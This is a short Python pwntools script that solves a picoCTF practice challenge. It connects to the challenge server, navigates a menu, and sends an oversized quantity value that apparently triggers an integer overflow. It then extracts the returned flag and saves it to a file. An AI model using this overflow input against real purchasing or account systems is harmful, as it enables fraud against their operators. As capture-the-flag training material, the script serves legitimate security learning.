#!/usr/bin/python3

from pwn import *

# nc jupiter.challenges.picoctf.org 4906

s = remote("jupiter.challenges.picoctf.org", 4906)

s.recv()
s.recv()

s.sendline(b'2')

s.recv()
s.recv()

s.sendline(b'1')
s.recv()
s.sendline(b'2147482648')
s.recv()
s.sendline(b'2')
s.recv()
s.sendline(b'2')
s.recv()
s.sendline(b'1')
s.recv()
h = s.recv().decode().split("\n")[0].split(": ")[-1]
print(h)

f = open('flag.txt', 'w')
f.write(h)
f.close()



s.close()
